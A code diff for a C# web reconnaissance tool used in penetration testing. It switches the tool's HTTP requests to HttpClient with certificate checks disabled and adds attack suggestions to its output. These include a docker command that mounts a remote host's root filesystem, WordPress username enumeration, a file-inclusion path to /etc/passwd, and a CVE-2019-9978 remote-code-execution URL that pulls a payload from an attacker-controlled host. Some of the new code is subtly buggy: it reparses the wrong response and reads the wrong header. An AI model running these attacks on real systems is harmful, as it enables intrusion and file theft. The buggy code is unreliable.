@@ -5,6 +5,8 @@ using System.Drawing;
 using System.IO;
 using System.Linq;
 using System.Net;
+using System.Net.Http;
+using System.Net.Http.Headers;
 using System.Security.Cryptography;
 using System.Security.Cryptography.X509Certificates;
 using System.Text.Json;
@@ -41,7 +43,7 @@ namespace Reecon
             Console.WriteLine("Web Info Scan Finished");
         }
 
-        private static void ScanPage(string url)
+        public static void ScanPage(string url)
         {
             Console.WriteLine("Scanning...");
             var httpInfo = Web.GetHTTPInfo(url);
@@ -178,7 +180,7 @@ namespace Reecon
                         href = url + href.TrimStart('/');
                     }
                 }
-                if (href.Length > 1)
+                if (href.Length > 1 && !href.StartsWith("#")) // Section - Not actual URL
                 {
                     if (doubleDash)
                     {
@@ -379,7 +381,10 @@ namespace Reecon
                             else if (file == "version" && pageText.Contains("Docker Engine - Community"))
                             {
                                 returnText += "-- Docker Engine Found!".Pastel(Color.Orange) + Environment.NewLine;
-                                returnText += $"--- Run: docker -H tcp://iphere:portHere ps" + Environment.NewLine;
+                                string dockerURL = url.Replace("https://", "tcp://").Replace("http://", "tcp://").Trim('/');
+                                returnText += $"--- List running Dockers: docker -H {dockerURL} ps" + Environment.NewLine;
+                                returnText += $"--- List Docker Images: docker -H {dockerURL} images" + Environment.NewLine;
+                                returnText += $"--- Mount Root FS: docker -H {dockerURL} run -it -v /:/woof imageName:ver bash" + Environment.NewLine;
                             }
                             // Git repo!
                             else if (file == ".git/HEAD")
@@ -490,18 +495,18 @@ namespace Reecon
                         continue;
                     }
                     returnText += $"- Common Path redirects: {url}{file}" + Environment.NewLine;
-                    if (response.Headers != null && response.Headers.Get("Location") != null)
+                    if (response.Headers != null && response.Headers.Location != null)
                     {
-                        returnText += $"-- Redirection Location: {response.Headers.Get("Location")}" + Environment.NewLine;
+                        returnText += $"-- Redirection Location: {response.Headers.Location}" + Environment.NewLine;
                     }
                 }
                 else if (response.StatusCode == HttpStatusCode.Unauthorized)
                 {
                     returnText += $"- Common path requires authentication: {url}{file}" + Environment.NewLine;
                     var headers = response.Headers;
-                    if (headers.AllKeys.Any() && headers.Get("WWW-Authenticate") != null)
+                    if (headers.Contains("WWW-Authenticate"))
                     {
-                        returnText += $"-- WWW-Authenticate: {headers.Get("WWW-Authenticate")}" + Environment.NewLine;
+                        returnText += $"-- WWW-Authenticate: {headers.GetValues("WWW-Authenticate").First()}" + Environment.NewLine;
                     }
                     if (response.PageText != "")
                     {
@@ -517,9 +522,9 @@ namespace Reecon
                 {
                     returnText += $"- Common path throws an Internal Server Error: {url}{file}" + Environment.NewLine;
                 }
-                else if (response.StatusCode == HttpStatusCode.NotFound && response.Headers.AllKeys.Contains("Docker-Distribution-Api-Version"))
+                else if (response.StatusCode == HttpStatusCode.NotFound && response.Headers.Contains("Docker-Distribution-Api-Version"))
                 {
-                    string dockerVersion = response.Headers["Docker-Distribution-Api-Version"];
+                    string dockerVersion = response.Headers.GetValues("Docker-Distribution-Api-Version").First();
                     returnText += "-- Docker Detected - API Version: " + dockerVersion + Environment.NewLine;
                     if (dockerVersion == "registry/2.0")
                     {
@@ -560,7 +565,7 @@ namespace Reecon
                 {
                     // Normally just http -> https
                     var headers = response.Headers;
-                    if (url.StartsWith("http") && headers.AllKeys.Contains("Location") && (headers.Get("Location").StartsWith("https")))
+                    if (url.StartsWith("http") && headers.Contains("Location") && (headers.Location.ToString().StartsWith("https")))
                     {
                         continue;
                     }
@@ -578,149 +583,93 @@ namespace Reecon
             return returnText.Trim(Environment.NewLine.ToArray());
         }
 
-        public static (HttpStatusCode StatusCode, string PageTitle, string PageText, string DNS, WebHeaderCollection Headers, X509Certificate2 SSLCert, string URL, string AdditionalInfo) GetHTTPInfo(string url, string userAgent = null)
+        public static (HttpStatusCode StatusCode, string PageTitle, string PageText, string DNS, HttpResponseHeaders Headers, X509Certificate2 SSLCert, string URL, string AdditionalInfo) GetHTTPInfo(string url, string userAgent = null)
         {
             string pageTitle = "";
             string pageText = "";
             string dns = "";
             HttpStatusCode statusCode = new();
-            WebHeaderCollection headers = null;
+            HttpResponseHeaders headers = null;
             X509Certificate2 cert = null;
-            // X509Certificate2 customCert = new CustomSSLCert();
 
-            // Note: HttpClient is specifically not used due to the untested way it deals with unexpected error messages
-            HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
+            // Ignore invalid SSL Cert
+            var httpClientHandler = new HttpClientHandler();
+            httpClientHandler.ServerCertificateCustomValidationCallback += (sender, certificate, chain, sslPolicyErrors) =>
+            {
+                if (certificate != null)
+                {
+                    cert = new X509Certificate2(certificate);
+                }
+                return true;
+            };
+            httpClientHandler.AllowAutoRedirect = false;
+
+            HttpClient httpClient = new HttpClient(httpClientHandler);
+            Uri theURL = new Uri(url);
+            HttpRequestMessage httpClientRequest = new HttpRequestMessage(HttpMethod.Get, theURL);
             if (userAgent != null)
             {
-                request.UserAgent = userAgent;
+                httpClientRequest.Headers.UserAgent.TryParseAdd(userAgent);
             }
             try
             {
-                // Ignore invalid SSL Cert
-                request.ServerCertificateValidationCallback += (sender, certificate, chain, sslPolicyErrors) =>
-                {
-                    if (certificate != null)
-                    {
-                        cert = new X509Certificate2(certificate);
-                    }
-                    return true;
-                };
-                request.AllowAutoRedirect = false;
-
-                // Can crash here due to a WebException on 401 Unauthorized / 403 Forbidden errors, so have to do some things twice
-                request.Timeout = 5000;
-                using var response = request.GetResponse() as HttpWebResponse;
-                statusCode = response.StatusCode;
-                dns = response.ResponseUri.DnsSafeHost;
-                headers = response.Headers;
-                using (StreamReader readStream = new(response.GetResponseStream()))
+                httpClient.Timeout = TimeSpan.FromMilliseconds(5000);
+                HttpResponseMessage httpClientResponse = httpClient.Send(httpClientRequest);
+                statusCode = httpClientResponse.StatusCode;
+                dns = theURL.DnsSafeHost;
+                headers = httpClientResponse.Headers;
+                using (StreamReader readStream = new(httpClientResponse.Content.ReadAsStream()))
                 {
                     pageText = readStream.ReadToEnd();
                 }
-                response.Close();
             }
             catch (TimeoutException ex)
             {
-                Console.WriteLine("Moo: " + ex.Message);
-            }
-            catch (WebException ex)
-            {
-                if (ex.Response == null)
-                {
-                    if (ex.Status == WebExceptionStatus.Timeout)
-                    {
-                        return (statusCode, null, null, null, null, null, url, "Timeout");
-                    }
-                    else if (ex.Message != null)
-                    {
-                        if (ex.Message.Trim() == "The request was aborted: Could not create SSL/TLS secure channel.")
-                        {
-                            Console.WriteLine("GetHTTPInfo.Error.SSLTLS - Bug Reelix to fix this");
-                        }
-                        else if (ex.Message.Trim() == "The underlying connection was closed: An unexpected error occurred on a send.")
-                        {
-                            Console.WriteLine("Legacy error - Bug Reelix!");
-                        }
-                        else if (ex.Message.Trim() == "The operation has timed out.")
-                        {
-                            Console.WriteLine("Legacy error - Bug Reelix!");
-                        }
-                        else if (ex.Message.Trim() == "Error: SecureChannelFailure (Authentication failed, see inner exception.)")
-                        {
-                            Console.WriteLine("Legacy error - Bug Reelix!");
-                        }
-                        else if (ex.Message.Trim() == "Error: ConnectFailure (Connection refused)" || ex.Message.Trim() == "Error: ConnectFailure (No route to host)")
-                        {
-                            Console.WriteLine("Legacy error - Bug Reelix!");
-                        }
-                        else if (ex.Message == "The SSL connection could not be established, see inner exception.")
-                        {
-                            return (statusCode, null, null, null, null, null, null, null);
-                        }
-                        else
-                        {
-                            Console.WriteLine("GetHTTPInfo.Error: " + ex.Message);
-                        }
-                    }
-                    return (statusCode, null, null, null, null, null, url, null);
-                }
-                HttpWebResponse response = (HttpWebResponse)ex.Response;
-                statusCode = response.StatusCode;
-                dns = response.ResponseUri.DnsSafeHost;
-                headers = response.Headers;
-                using (StreamReader readStream = new(response.GetResponseStream()))
-                {
-                    pageText = readStream.ReadToEnd();
-                }
-                response.Close();
+                Console.WriteLine("HttpClient Timeout Error: " + ex.Message);
             }
             catch (Exception ex)
             {
-                // Something went really wrong...
-                Console.WriteLine("GetHTTPInfo - Fatal Woof :( - " + ex.Message);
-                return (statusCode, null, null, null, null, null, url, null);
+                if (ex.Message.StartsWith("The SSL connection could not be established, see inner exception"))
+                {
+                    // Not valid
+                    return (statusCode, null, null, null, null, null, null, null);
+                }
+                else
+                {
+                    Console.WriteLine("HttpClient rewrite had an error: " + ex.Message + ex.InnerException);
+                }
             }
-
             if (pageText.Contains("<title>") && pageText.Contains("</title>"))
             {
                 pageTitle = pageText.Remove(0, pageText.IndexOf("<title>") + "<title>".Length);
                 pageTitle = pageTitle.Substring(0, pageTitle.IndexOf("</title>"));
             }
-            if (request.ServicePoint.Certificate != null)
-            {
-                cert = new X509Certificate2(request.ServicePoint.Certificate);
-            }
             return (statusCode, pageTitle, pageText, dns, headers, cert, url, null);
         }
 
-        public static string FormatHTTPInfo(HttpStatusCode StatusCode, string PageTitle, string PageText, string DNS, WebHeaderCollection Headers, X509Certificate2 SSLCert, string URL)
+        public static string FormatHTTPInfo(HttpStatusCode StatusCode, string PageTitle, string PageText, string DNS, HttpResponseHeaders Headers, X509Certificate2 SSLCert, string URL)
         {
             string urlPrefix = url.StartsWith("https") ? "https" : "http";
             string responseText = "";
-            List<string> headerList = new();
-            if (Headers != null)
-            {
-                headerList = Headers.AllKeys.ToList();
-            }
             if (StatusCode != HttpStatusCode.OK)
             {
                 // There's a low chance that it will return a StatusCode that is not in the HttpStatusCode list in which case (int)StatusCode will crash
                 if (StatusCode == HttpStatusCode.MovedPermanently)
                 {
-                    if (Headers != null && Headers.Get("Location") != null)
+                    if (Headers != null && Headers.Location != null)
                     {
                         responseText += "- Moved Permanently" + Environment.NewLine;
-                        responseText += "-> Location: " + Headers.Get("Location") + Environment.NewLine;
-                        headerList.Remove("Location");
+                        responseText += "-> Location: " + Headers.Location + Environment.NewLine;
+                        Headers.Remove("Location");
                     }
                 }
                 else if (StatusCode == HttpStatusCode.Redirect)
                 {
-                    if (Headers != null && Headers.Get("Location") != null)
+                    if (Headers != null && Headers.Location != null)
                     {
                         responseText += "- Redirect" + Environment.NewLine;
-                        responseText += "-> Location: " + Headers.Get("Location") + Environment.NewLine;
-                        headerList.Remove("Location");
+                        responseText += "-> Location: " + Headers.Location + Environment.NewLine;
+                        Headers.Remove("Location");
                     }
                 }
                 else if (StatusCode == HttpStatusCode.NotFound)
@@ -737,13 +686,14 @@ namespace Reecon
                     {
                         responseText += "- Unknown Status Code: " + " " + StatusCode + Environment.NewLine;
                     }
-                    if (Headers != null && Headers.Get("Location") != null)
+                    if (Headers != null && Headers.Location != null)
                     {
-                        responseText += "-> Location: " + Headers.Get("Location") + Environment.NewLine;
-                        headerList.Remove("Location");
+                        responseText += "-> Location: " + Headers.Location + Environment.NewLine;
+                        Headers.Remove("Location");
                     }
                 }
             }
+            // Page Title
             if (!string.IsNullOrEmpty(PageTitle))
             {
                 PageTitle = PageTitle.Trim();
@@ -853,6 +803,8 @@ namespace Reecon
                     }
                 }
             }
+
+            // Page Text
             if (PageText.Length > 0)
             {
                 if (PageText.Length < 250)
@@ -864,7 +816,7 @@ namespace Reecon
                 if (PageText.Contains("/wp-content/themes/") && PageText.Contains("/wp-includes/"))
                 {
                     responseText += "- Wordpress detected!".Pastel(Color.Orange) + Environment.NewLine;
-                    // Basic User Enumeration
+                    // Basic User Enumeration - Need to combine these two...
                     List<string> wpUsers = new();
                     var wpUserTestOne = Web.GetHTTPInfo($"{urlPrefix}://{DNS}/wp-json/wp/v2/users");
                     if (wpUserTestOne.StatusCode == HttpStatusCode.OK)
@@ -872,25 +824,27 @@ namespace Reecon
                         var document = JsonDocument.Parse(wpUserTestOne.PageText);
                         foreach (JsonElement element in document.RootElement.EnumerateArray())
                         {
-                            string wpUser = element.GetProperty("name").GetString();
-                            if (!wpUsers.Contains(wpUser))
+                            string wpUserName = element.GetProperty("name").GetString();
+                            string wpUserSlug = element.GetProperty("slug").GetString();
+                            if (!wpUsers.Contains(wpUserName))
                             {
-                                wpUsers.Add(wpUser);
-                                responseText += ("-- Wordpress User Found: " + wpUser).Pastel(Color.Orange) + Environment.NewLine;
+                                wpUsers.Add(wpUserSlug);
+                                responseText += ("-- Wordpress User Found: " + wpUserName + " (Username: " + wpUserSlug + ")").Pastel(Color.Orange) + Environment.NewLine;
                             }
                         }
                     }
                     var wpUserTestTwo = Web.GetHTTPInfo($"{urlPrefix}://{DNS}/index.php/wp-json/wp/v2/users");
                     if (wpUserTestTwo.StatusCode == HttpStatusCode.OK)
                     {
-                        var document = JsonDocument.Parse(wpUserTestTwo.PageText);
+                        var document = JsonDocument.Parse(wpUserTestOne.PageText);
                         foreach (JsonElement element in document.RootElement.EnumerateArray())
                         {
-                            string wpUser = element.GetProperty("name").GetString();
-                            if (!wpUsers.Contains(wpUser))
+                            string wpUserName = element.GetProperty("name").GetString();
+                            string wpUserSlug = element.GetProperty("slug").GetString();
+                            if (!wpUsers.Contains(wpUserName))
                             {
-                                wpUsers.Add(wpUser);
-                                responseText += ("-- Wordpress User Found: " + wpUser).Pastel(Color.Orange) + Environment.NewLine;
+                                wpUsers.Add(wpUserSlug);
+                                responseText += ("-- Wordpress User Found: " + wpUserName + " (Username: " + wpUserSlug + ")").Pastel(Color.Orange) + Environment.NewLine;
                             }
                         }
                     }
@@ -900,8 +854,15 @@ namespace Reecon
                     {
                         responseText += "-- Vulnerable Plugin Detected".Pastel(Color.Orange) + $" - {urlPrefix}://{DNS}/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/etc/passwd" + Environment.NewLine;
                     }
+                    else if (PageText.Contains("/wp-content/plugins/social-warfare"))
+                    {
+                        responseText += "-- Possible Vulnerable Plugin Detected (Vuln if <= 3.5.2) - CVE-2019-9978".Pastel(Color.Orange) + $" - http://192.168.56.78/wordpress/wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://yourIPHere:5901/rce.txt" + Environment.NewLine;
+                        responseText += "--- rce.txt: <pre>system('cat /etc/passwd')</pre>" + Environment.NewLine;
+                    }
 
-                    responseText += $"-- wpscan --url http://{DNS}/ --enumerate u1-5" + Environment.NewLine;
+                    responseText += $"-- User Enumeration: wpscan --url {urlPrefix}://{DNS}/ --enumerate u1-5" + Environment.NewLine;
+                    responseText += $"-- Plugin Enumeration: wpscan --url {urlPrefix}://{DNS}/ --enumerate p" + Environment.NewLine;
+                    responseText += $"-- User + Plugin Enumeration: wpscan --url {urlPrefix}://{DNS}/ --enumerate u1-5,p" + Environment.NewLine;
 
                     // Checking for wp-login.php
                     var wplogin = GetHTTPInfo($"{urlPrefix}://{DNS}/wp-login.php");
@@ -944,19 +905,21 @@ namespace Reecon
                     responseText += "-- Try: run Metasploit windows/http/icecast_header" + Environment.NewLine;
                 }
             }
+
+            // DNS
             if (!string.IsNullOrEmpty(DNS))
             {
                 responseText += "- DNS: " + DNS + Environment.NewLine;
             }
+
             // Headers!
-            if (headerList.Any())
+            if (Headers.Any())
             {
-                headerList = Headers.AllKeys.ToList();
                 // Useful info
-                if (headerList.Contains("Server"))
+                if (Headers.Any(x => x.Key == "Server"))
                 {
-                    headerList.Remove("Server");
-                    string serverText = Headers.Get("Server").Trim();
+                    string serverText = Headers.Server.ToString();
+                    Headers.Remove("Server");
                     responseText += "- Server: " + serverText + Environment.NewLine;
                     if (serverText.StartsWith("MiniServ/"))
                     {
@@ -991,45 +954,48 @@ namespace Reecon
                     }
                 }
                 // Useful info
-                if (headerList.Contains("X-Powered-By"))
+                if (Headers.Any(x => x.Key == "X-Powered-By"))
                 {
-                    headerList.Remove("X-Powered-By");
-                    string poweredBy = Headers.Get("X-Powered-By");
+                    string poweredBy = Headers.GetValues("X-Powered-By").First();
+                    Headers.Remove("X-Powered-By");
                     responseText += "- X-Powered-By: " + poweredBy + Environment.NewLine;
                     if (poweredBy.Contains("JBoss"))
                     {
                         responseText += "-- " + "JBoss Detected - Run jexboss - https://github.com/joaomatosf/jexboss <-----".Pastel(Color.Orange) + Environment.NewLine;
                     }
                 }
-                if (headerList.Contains("X-Generator"))
+                if (Headers.Any(x => x.Key == "X-Generator"))
                 {
-                    headerList.Remove("X-Generator");
-                    string generator = Headers.Get("X-Powered-By");
+                    string generator = Headers.GetValues("X-Powered-By").First();
+                    Headers.Remove("X-Generator");
                     responseText += "- X-Generator: " + generator + Environment.NewLine;
                 }
                 // Requires a login
-                if (headerList.Contains("WWW-Authenticate"))
+                if (Headers.Any(x => x.Key == "WWW-Authenticate"))
                 {
-                    headerList.Remove("WWW-Authenticate");
-                    responseText += "- WWW-Authenticate: " + Headers.Get("WWW-Authenticate") + Environment.NewLine;
+                    string wwwAuthenticate = Headers.WwwAuthenticate.ToString();
+                    Headers.Remove("WWW-Authenticate");
+                    responseText += "- WWW-Authenticate: " + wwwAuthenticate + Environment.NewLine;
                 }
                 // Kabana
-                if (headerList.Contains("kbn-name"))
+                if (Headers.Any(x => x.Key == "kbn-name"))
                 {
-                    headerList.Remove("kbn-name");
-                    responseText += "- kbn-name: " + Headers.Get("kbn-name") + Environment.NewLine;
+                    string kbnName = Headers.GetValues("kbn-name").ToString();
+                    Headers.Remove("kbn-name");
+                    responseText += "- kbn-name: " + kbnName + Environment.NewLine;
                     responseText += "-- You should get more kibana-based info further down" + Environment.NewLine; ;
                 }
-                if (headerList.Contains("kbn-version"))
+                if (Headers.Any(x => x.Key == "kbn-version"))
                 {
-                    headerList.Remove("kbn-version");
-                    responseText += "- kbn-version: " + Headers.Get("kbn-version") + Environment.NewLine;
+                    string kbnVersion = Headers.GetValues("kbn-version").ToString();
+                    Headers.Remove("kbn-version");
+                    responseText += "- kbn-version: " + kbnVersion + Environment.NewLine;
                 }
                 // Useful cookies
-                if (headerList.Contains("Set-Cookie"))
+                if (Headers.Any(x => x.Key == "Set-Cookie"))
                 {
-                    headerList.Remove("Set-Cookie");
-                    string setCookie = Headers.Get("Set-Cookie");
+                    string setCookie = Headers.GetValues("Set-Cookie").First();
+                    Headers.Remove("Set-Cookie");
                     responseText += "- Set-Cookie: " + setCookie + Environment.NewLine;
                     if (setCookie.StartsWith("CUTENEWS_SESSION"))
                     {
@@ -1037,9 +1003,9 @@ namespace Reecon
                     }
                 }
                 // Fun content types
-                if (headerList.Contains("Content-Type"))
+                if (Headers.Any(x => x.Key == "Content-Type"))
                 {
-                    string contentType = Headers.Get("Content-Type");
+                    string contentType = Headers.GetValues("Content-Type").First();
                     if (contentType.StartsWith("text/html"))
                     {
                         // Skip it
@@ -1047,15 +1013,21 @@ namespace Reecon
                     else if (contentType.StartsWith("image"))
                     {
                         // The entire thing is an image - It's special!
-                        responseText += "- Content Type: " + Headers.Get("Content-Type").Pastel(Color.Orange) + " <--- It's an image!" + Environment.NewLine;
+                        responseText += "- Content Type: " + contentType.Pastel(Color.Orange) + " <--- It's an image!" + Environment.NewLine;
                     }
                     else
                     {
                         // A unique content type - Might be interesting
-                        responseText += "- Content-Type: " + Headers.Get("Content-Type") + Environment.NewLine;
+                        responseText += "- Content-Type: " + contentType + Environment.NewLine;
                     }
                 }
-                responseText += "- Other Headers: " + string.Join(",", headerList) + Environment.NewLine;
+                string otherHeaders = "";
+                foreach (var header in Headers)
+                {
+                    otherHeaders += header.Key + ",";
+                }
+                otherHeaders = otherHeaders.Trim(',');
+                responseText += "- Other Headers: " + otherHeaders + Environment.NewLine;
             }
             if (SSLCert != null)
             {
